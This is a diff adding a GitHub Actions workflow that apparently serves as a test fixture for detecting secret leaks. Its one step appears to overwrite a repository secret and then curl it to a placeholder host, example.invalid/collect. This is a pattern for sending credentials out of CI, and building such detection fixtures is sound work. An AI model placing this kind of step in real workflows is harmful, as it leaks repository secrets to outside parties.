@@ -1,0 +1,15 @@
+name: B34-overwrite-fake-secret
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: "${{ secrets.TEST_SECRET }}"
+
+    steps:
+      - run: |
+          SECRET= "Not_Secret"
+          curl --data "$SECRET" https://example.invalid/collect
